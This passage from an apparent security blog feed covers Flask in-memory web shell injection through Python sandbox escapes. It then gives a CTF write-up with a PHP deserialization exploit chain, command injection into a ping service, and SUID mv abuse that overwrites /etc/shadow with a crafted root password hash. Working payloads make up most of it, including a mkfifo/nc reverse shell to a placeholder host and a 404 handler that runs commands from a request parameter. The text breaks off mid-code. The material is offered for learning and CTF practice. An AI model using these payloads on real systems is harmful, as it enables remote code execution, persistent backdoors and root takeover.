python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc ip port &gt; /tmp/fifo; rm /tmp/fifo&#x27;))&quot;</span>)</span><br></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 11.txt&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>æ­¤å‡½æ•°å¯ä»¥ç”¨äºè‡ªå®šä¹‰ 404 é¡µé¢çš„å›æ˜¾ï¼Œç”¨äºå¤„ç†åº”ç”¨ç¨‹åºä¸­å‘ç”Ÿçš„é”™è¯¯ï¼Œå½“ä½  flask é‡åˆ°é”™è¯¯ï¼Œä½ å¯ä»¥å®šä¹‰è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†ç¨‹åºæ¥å¤„ç†é”™è¯¯å¹¶è¿”å›é€‚å½“çš„å“åº”</p><p>è·Ÿè¿›æ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">        <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)      <span class="comment">#è¿™ä¸ªæ˜¯å»æ³¨å†Œf</span></span><br><span class="line">        <span class="keyword">return</span> f         <span class="comment">#è¿”å›çš„æ˜¯é”™è¯¯å¤„ç†å‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="comment"># T_error_handler   é”™è¯¯å¤„ç†å‡½æ•°çš„ç±»å‹</span></span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›çœ‹çœ‹æ˜¯æ€ä¹ˆæ³¨å†Œçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">        f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">        <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨å†Œå°±æ˜¯error_handler_specï¼Œå®ƒçš„ç»“æ„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.error<span class="built_in">_</span>handler<span class="built_in">_</span>spec = &#123;</span><br><span class="line">    None: &#123;</span><br><span class="line">        404: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>404,</span><br><span class="line">            AnotherException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>another,</span><br><span class="line">        &#125;,</span><br><span class="line">        500: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>500,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡codeå’Œexc_classå»æ³¨å†Œè¿™ä¸ªfï¼ˆé”™è¯¯å¤„ç†å‡½æ•°ï¼‰ï¼Œ</p><p>ä½†æ˜¯è¿™ä¸¤å®¶ä¼™ç”±_get_exc_class_and_code(code_or_exception)è¿™ä¸ªæ§åˆ¶</p><blockquote><p>è¿™ä¸ªå®šä¹‰çš„å‡½æ•° _get_exc_class_and_code æ˜¯ç”¨æ¥å¤„ç†å¼‚å¸¸ç±»æˆ– HTTP çŠ¶æ€ç çš„ã€‚å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œexc_class_or_codeï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå¼‚å¸¸ç±»æˆ–è€…ä¸€ä¸ª HTTP çŠ¶æ€ç ï¼ˆæ•´å‹ï¼‰ã€‚</p></blockquote><p>é‚£ä¹ˆæ¥ä¸‹æ¥ç›´æ¥æ§åˆ¶fä¸å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">global exc_class</span></span><br><span class="line"><span class="string">global code</span></span><br><span class="line"><span class="string">exc_class, code = app._get_exc_class_and_code(404)</span></span><br><span class="line"><span class="string">app.error_handler_spec[None][code][exc_class] =</span></span><br><span class="line"><span class="string">lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯åœ¨execé‡Œé¢å¿…é¡»æŒ‡å®šexecçš„ç”±æ¥ï¼Œä¸åƒä¹‹å‰sstié‡Œé¢æ‰“çš„</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(request.values.x).read()&#125;&#125;<span class="built_in">&amp;</span>x=cat /f*</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¹Ÿç®—æ˜¯å­¦äº†ä¸€ä¸‹åŸç†ï¼Œä¸»è¦å°±æ˜¯è€é©¬ï¼šåŠ è·¯ç”±ï¼æ–°é©¬ï¼šä¸»è¦å°±æ˜¯æ‰“å…¥é’©å­å‡½æ•°ï¼Œåœ¨ç‰¹å®šçš„æ—¶æœºå»è§¦å‘ï¼</p><p>å½“ç„¶ä¸åªæ˜¯flaskæ¡†æ¶ä¸‹å¯ä»¥æ‰“å†…å­˜é©¬ï¼Œä¸åŒçš„æ¡†æ¶æœ‰ä¸åŒçš„æ‰“æ³•ï¼Œä½†åŸç†ä¼°æ‘¸ç€éƒ½ç±»ä¼¼å§ï¼</p><p>æ¯”å¦‚ï¼š<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI å†…å­˜é©¬çš„ç ”ç©¶ - caterpieçš„å°ç«™</a></p>]]></content>
      
      
      <categories>
          
          <category> pythonå†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜Ÿé€”ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>çªç„¶æ„Ÿè§‰è¿™ä¸ªæ¯”èµ›è€ƒçš„ä¸œè¥¿æŒºå¥½çš„ï¼Œä½†æ˜¯åœ¨æ‰“çš„æ—¶å€™å¤ªå¿ƒæ€¥äº†ï¼</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢çš„é“¾å­æŒºç®€å•çš„å°±ä¸åˆ†æäº†ï¼Œå…³é”®æ˜¯å¦‚ä½•å»è§¦å‘backdoorè¿™ä¸ªæ–¹æ³•ï¼Ÿ</p><p><strong>åˆ†é“¾å­æ‰“æ³•åŠ &amp;å¼•ç”¨</strong></p><p>æ‰€è°“åˆ†é“¾å­å°±æ˜¯é“¾å­ä¸€åˆ†ä¸ºäºŒå‘—ï¼Œå¼•ç”¨å°±æ˜¯å…±äº«åŒä¸€å†…å­˜ï¼Œè¿™æ„å‘³ç€ï¼Œåªè¦å†…å­˜å‘ç”Ÿå˜åŒ–ï¼Œ&amp;å¼•ç”¨ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callableçš„å½¢å¼å»è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸»è¦æœ‰ä¸¤ä¸ªç–‘é—®ï¼š</p><p>1.åœ¨è§¦å‘<code>__toString</code>æ–¹æ³•çš„æ—¶å€™ä¸ºä»€ä¹ˆè¿˜è¦å¤šåˆ›å»ºä¸€ä¸ª<code>$c2 = new Chloe();</code>å¯¹è±¡ï¼Ÿ</p><p>2.ä¸ºä»€ä¹ˆåœ¨åˆ›å»ºæ•°ç»„callableçš„æ—¶å€™ç¬¬ä¸€ä¸ªå…ƒç´ è¦åŠ ä¸Š&amp;ï¼Ÿ</p><p>å¯¹äºç¬¬ä¸€ä¸ªè¿™å°±æ˜¯æˆ‘è¯´çš„åˆ†é“¾å­ï¼Œæ˜¯ä¸ºäº†è®©é“¾å­çš„ç»“æ„æ›´åˆ†æ˜ï¼é‚£ä¸ºä»€ä¹ˆè¦åŠ &amp;å‘¢ï¼Ÿ</p><p>è¿™å…¶å®æ˜¯ä¸€ä¸ª<strong>å…ˆåé¡ºåº</strong>çš„é—®é¢˜ï¼å‡è®¾æ²¡æœ‰è¿™ä¸ª&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>ä½ è¿™ä¸ªçš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯nullï¼Œæœ‰&amp;è¿™ä¸ªé‚£ä¹ˆå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ä¸<code>$c2-&gt;fu</code>å…±äº«åŒä¸€å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±æ˜¯&amp;nullï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åä¼šè§¦å‘<code>__toString</code>ä»è€Œå®ç°<code>$c2-&gt;fu</code>å°±æ˜¯ä¸€ä¸ªå¯¹è±¡äº†ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹ï¼š1ï¼Œåˆ†é“¾å­ 2ï¼Œcallable 3ï¼Œå¼•ç”¨å†…å­˜å…±äº«</span><br></pre></td></tr></table></figure><h2 id="è¶…çº§ping"><a href="#è¶…çº§ping" class="headerlink" title="è¶…çº§ping"></a>è¶…çº§ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>ç›´æ¥å°±æœ‰shelläº†ï¼é‚£ä¼šä¸ä¼šæ˜¯æ²¡æƒé™å‘¢ï¼Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰¾äº†ä¼¼ä¹æ²¡æœ‰ï¼Œé‚£åªèƒ½è€ƒè™‘åœ¨å½“å‰ç”¨æˆ·æ²¡æœ‰æƒé™çš„ç›®å½•ä¸‹äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>æœç„¶è¿™ä¸ªç›®å½•å°±åªç»™äº†æ–‡ä»¶æ‰€æœ‰è€…æƒé™</p><p>å°è¯•suidææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨mvææƒï¼šæ„é€ æ¶æ„æ–‡ä»¶ï¼Œç„¶åmvç§»åŠ¨æ±¡æŸ“&#x2F;etc&#x2F;shadow(è¿™æ˜¯å­˜å‚¨ç”¨æˆ·å¯†ç çš„åœ°æ–¹)</p><p>æ„é€ åŠ ç›åŠ å¯†çš„å¯†ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwdï¼šopenssl å·¥å…·ä¸­ç”¨äºç”Ÿæˆå¯†ç å“ˆå¸Œçš„å­å‘½ä»¤</span><br><span class="line">-1ï¼šæŒ‡å®šä½¿ç”¨ MD5 ç®—æ³•æ¥ç”Ÿæˆå“ˆå¸Œï¼Œè¿™æ˜¯ Linux ç³»ç»Ÿä¸­å¸¸è§ä¸”å…¼å®¹çš„æ ¼å¼ï¼ˆé€šå¸¸ä»¥ $1$ å¼€å¤´ï¼‰</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">æœ€ç»ˆè¦å†™çš„ï¼šroot:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶ï¼ˆå¯»æ‰¾å¯å†™ç›®å½•ï¼‰ï¼š</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span 